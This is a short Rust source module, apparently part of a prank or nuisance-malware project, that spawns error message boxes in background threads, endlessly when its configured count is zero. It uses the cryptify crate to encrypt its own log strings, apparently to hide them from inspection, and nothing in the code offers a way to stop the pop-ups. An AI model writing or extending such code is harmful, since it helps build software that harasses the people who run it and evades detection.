use cryptify::encrypt_string;
use native_dialog::{MessageDialog, MessageType};
use std::thread;
use std::time::Duration;

/// Spawn message boxes in a loop without blocking
pub fn spawn_messagebox_hell() {
    let count = crate::config::MESSAGEBOX_LOOP_COUNT;
    let delay = Duration::from_secs(crate::config::MESSAGEBOX_DELAY_SECONDS);
    
    // Spawn in a separate thread so it doesn't block
    thread::spawn(move || {
        if count == 0 {
            // Infinite loop
            loop {
                spawn_single_messagebox();
                thread::sleep(delay);
            }
        } else {
            // Fixed count
            for i in 1..=count {
                if crate::config::SHOW_CLI {
                    println!("{} {}/{}", 
                        encrypt_string!("Spawning message box"),
                        i,
                        count
                    );
                }
                
                spawn_single_messagebox();
                
                // Don't sleep after the last one
                if i < count {
                    thread::sleep(delay);
                }
            }
        }
    });
}

/// Spawn a single message box in its own thread (non-blocking)
fn spawn_single_messagebox() {
    let title = crate::config::MESSAGEBOX_TITLE.to_string();
    let text = crate::config::MESSAGEBOX_TEXT.to_string();
    
    // Each message box runs in its own thread
    thread::spawn(move || {
        MessageDialog::new()
            .set_type(MessageType::Error)
            .set_title(&title)
            .set_text(&text)
            .show_alert()
            .ok();
    });
}
